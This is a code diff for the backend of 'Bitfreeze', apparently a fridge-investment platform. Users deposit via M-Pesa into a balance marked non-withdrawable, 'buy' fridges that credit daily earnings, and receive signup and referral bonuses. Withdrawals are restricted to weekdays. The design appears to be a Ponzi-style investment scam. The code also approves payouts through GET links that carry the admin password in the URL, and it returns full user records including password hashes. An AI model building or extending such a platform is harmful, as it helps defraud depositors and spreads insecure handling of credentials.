@@ -43,7 +43,6 @@ const REFERRAL_RULES = [
   { min: 500, reward: 50 },
 ];
 
-// Middleware
 app.use(bodyParser.json());
 app.use(cors({ origin: DOMAIN }));
 app.use(express.static(path.join(__dirname, 'public')));
@@ -53,21 +52,20 @@ mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log('MongoDB connected'))
   .catch(e => console.error('MongoDB connection error:', e));
 
-// ===================== SCHEMA =====================
+// ===================== SCHEMAS =====================
 const userSchema = new mongoose.Schema({
   name: String,
   email: String,
   password: String,
   phone: String,
-  balance: { type: Number, default: 0 },
-  earning: { type: Number, default: 0 },
-  lockedBonus: { type: Number, default: 0 },
+  depositBalance: { type: Number, default: 0 }, // cannot withdraw
+  earningsBalance: { type: Number, default: 0 }, // can withdraw
   fridges: { type: Array, default: [] },
   referrals: { type: Array, default: [] },
   referredBy: String,
+  createdAt: { type: Date, default: Date.now },
   lastPaid: String,
   firstDepositMade: { type: Boolean, default: false },
-  createdAt: { type: Date, default: Date.now }
 });
 
 const depositSchema = new mongoose.Schema({
@@ -99,8 +97,7 @@ const Withdrawal = mongoose.model('Withdrawal', withdrawalSchema);
 function auth(req, res, next) {
   const a = req.headers.authorization;
   if (!a || !a.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
-  try { req.user = jwt.verify(a.slice(7), SECRET); next(); } 
-  catch { return res.status(401).json({ error: 'Invalid token' }); }
+  try { req.user = jwt.verify(a.slice(7), SECRET); next(); } catch { return res.status(401).json({ error: 'Invalid token' }); }
 }
 
 async function tgSend(text, buttons) {
@@ -123,19 +120,18 @@ app.post('/api/register', async (req, res) => {
   const ref = referrerEmail?.trim() || undefined;
 
   const user = new User({ 
-    name, 
-    email, 
-    password: hashed, 
-    referredBy: ref,
-    balance: 0,
-    earning: 0,
-    lockedBonus: 0,
-    firstDepositMade: false
+    name, email, password: hashed, referredBy: ref,
+    earningsBalance: 200 // registration bonus goes to earnings
   });
+
   await user.save();
 
   const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
-  res.json({ message: 'Registered successfully', token, email: user.email });
+  res.json({
+    message: 'Registered successfully. You got KES 200 bonus in earnings.',
+    token,
+    email: user.email
+  });
 });
 
 // Login
@@ -146,7 +142,7 @@ app.post('/api/login', async (req, res) => {
   const ok = await bcrypt.compare(password, user.password);
   if (!ok) return res.status(400).json({ error: 'Invalid credentials' });
   const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
-  res.json({ token, email: user.email, phone: user.phone, balance: user.balance, earning: user.earning });
+  res.json({ token, email: user.email, phone: user.phone, depositBalance: user.depositBalance, earningsBalance: user.earningsBalance });
 });
 
 // Deposit
@@ -157,12 +153,21 @@ app.post('/api/deposit', auth, async (req, res) => {
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
 
-  if (amount < 500) return res.status(400).json({ error: 'Minimum deposit is 500 KES' });
+  const allowedAmounts = FRIDGES.map(f => f.price);
+  if (!allowedAmounts.includes(Number(amount))) return res.status(400).json({ error: `Deposit must be exact fridge amounts: ${allowedAmounts.join(', ')}` });
 
   const pending = await Deposit.findOne({ email: u.email, status: 'PENDING' });
   if (pending) return res.status(400).json({ error: 'You have a pending deposit' });
 
-  const deposit = new Deposit({ id: crypto.randomUUID(), email: u.email, phone, amount: Number(amount), mpesaCode, status: 'PENDING', requestedAt: Date.now() });
+  const deposit = new Deposit({
+    id: crypto.randomUUID(),
+    email: u.email,
+    phone,
+    amount: Number(amount),
+    mpesaCode,
+    status: 'PENDING',
+    requestedAt: Date.now()
+  });
   await deposit.save();
 
   const text = `🟢 <b>New Deposit Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nMPESA Code: <b>${mpesaCode}</b>\nDeposit ID: ${deposit.id}\nStatus: PENDING`;
@@ -192,44 +197,62 @@ app.get('/api/admin/deposits/:id/:action', async (req, res) => {
   if (deposit.status === 'APPROVED') {
     const u = await User.findOne({ email: deposit.email });
     if (u) {
-      u.balance += Number(deposit.amount); // deposit added to balance
-      u.firstDepositMade = true;
-      await u.save();
+      u.depositBalance += Number(deposit.amount);
+      if (!u.firstDepositMade) {
+        u.firstDepositMade = true;
+        await u.save();
 
-      // Handle referral reward
-      if (u.referredBy) {
-        const refUser = await User.findOne({ email: u.referredBy });
-        if (refUser) {
-          const rewardRule = REFERRAL_RULES.find(r => deposit.amount >= r.min);
-          if (rewardRule) {
-            refUser.earning += rewardRule.reward;
-            await refUser.save();
+        // Referral reward to referredBy
+        if (u.referredBy) {
+          const referrer = await User.findOne({ email: u.referredBy });
+          if (referrer) {
+            let reward = 0;
+            for (const rule of REFERRAL_RULES) {
+              if (deposit.amount >= rule.min) { reward = rule.reward; break; }
+            }
+            if (reward > 0) {
+              referrer.earningsBalance += reward;
+              referrer.referrals.push({ email: u.email, reward, date: new Date() });
+              await referrer.save();
+            }
           }
         }
       }
+      await u.save();
     }
   }
 
   res.send(`Deposit ${deposit.status}`);
 });
 
-// Withdraw (only from earnings)
+// Withdraw
 app.post('/api/withdraw', auth, async (req, res) => {
   const { amount, phone } = req.body || {};
   if (!amount || !phone) return res.status(400).json({ error: 'amount & phone required' });
 
+  const today = new Date();
+  const day = today.getDay(); // 0=Sunday,6=Saturday
+  if (day === 0 || day === 6) return res.status(400).json({ error: 'Withdrawals allowed Monday to Friday only' });
+
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
 
-  if (u.earning < Number(amount)) return res.status(400).json({ error: 'Insufficient earnings balance' });
+  if (u.earningsBalance < Number(amount)) return res.status(400).json({ error: 'Insufficient earnings balance' });
 
   const pending = await Withdrawal.findOne({ email: u.email, status: 'PENDING' });
   if (pending) return res.status(400).json({ error: 'You have a pending withdrawal' });
 
-  const w = new Withdrawal({ id: crypto.randomUUID(), email: u.email, phone, amount: Number(amount), status: 'PENDING', requestedAt: Date.now() });
+  const w = new Withdrawal({
+    id: crypto.randomUUID(),
+    email: u.email,
+    phone,
+    amount: Number(amount),
+    status: 'PENDING',
+    requestedAt: Date.now()
+  });
   await w.save();
 
-  const text = `🔵 <b>New Withdrawal Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nEarning Balance: KES ${u.earning}\nWithdraw ID: ${w.id}\nStatus: PENDING`;
+  const text = `🔵 <b>New Withdrawal Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nEarnings Balance: KES ${u.earningsBalance}\nWithdraw ID: ${w.id}\nStatus: PENDING`;
   const buttons = [[
     { text: '✅ Approve', url: `${DOMAIN}/api/admin/withdrawals/${w.id}/approve?token=${ADMIN_PASS}` },
     { text: '❌ Reject', url: `${DOMAIN}/api/admin/withdrawals/${w.id}/reject?token=${ADMIN_PASS}` }
@@ -256,7 +279,7 @@ app.get('/api/admin/withdrawals/:id/:action', async (req, res) => {
   if (w.status === 'APPROVED') {
     const u = await User.findOne({ email: w.email });
     if (u) {
-      u.earning -= Number(w.amount);
+      u.earningsBalance -= Number(w.amount);
       await u.save();
     }
   }
@@ -276,7 +299,7 @@ async function runDailyEarnings() {
       if (fridge) earn += fridge.dailyEarn;
     }
     if (earn > 0) {
-      u.earning += earn; // only earning increases
+      u.earningsBalance += earn;
       u.lastPaid = today;
       await u.save();
     }
@@ -290,9 +313,6 @@ setInterval(async () => {
   if (Number(hours) === 0 && Number(minutes) === 0) await runDailyEarnings();
 }, 5601000);
 
-// Status
-app.get('/api/status', (req, res) => res.json({ status: 'ok', time: Date.now(), till: MPESA_TILL, name: MPESA_NAME }));
-
 // Fridges list
 app.get('/api/fridges', (req, res) => res.json({ fridges: FRIDGES }));
 
@@ -303,11 +323,11 @@ app.post('/api/buy', auth, async (req, res) => {
   if (!item) return res.status(400).json({ error: 'Invalid fridge' });
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
-  if (u.balance < item.price) return res.status(400).json({ error: 'Insufficient balance' });
-  u.balance -= item.price;
+  if (u.depositBalance < item.price) return res.status(400).json({ error: 'Insufficient deposit balance' });
+  u.depositBalance -= item.price;
   u.fridges.push({ id: item.id, name: item.name, price: item.price, boughtAt: Date.now() });
   await u.save();
-  res.json({ message: `Bought ${item.name}`, balance: u.balance });
+  res.json({ message: `Bought ${item.name}`, depositBalance: u.depositBalance });
 });
 
 // Profile
@@ -316,6 +336,9 @@ app.get('/api/me', auth, async (req, res) => {
   if (!u) return res.status(404).json({ error: 'Not found' });
   res.json({ user: u });
 });
+
+// Status
+app.get('/api/status', (req, res) => res.json({ status: 'ok', time: Date.now(), till: MPESA_TILL, name: MPESA_NAME }));
 
 // Start server
 app.listen(PORT, () => console.log(`Bitfreeze running on ${PORT}`));
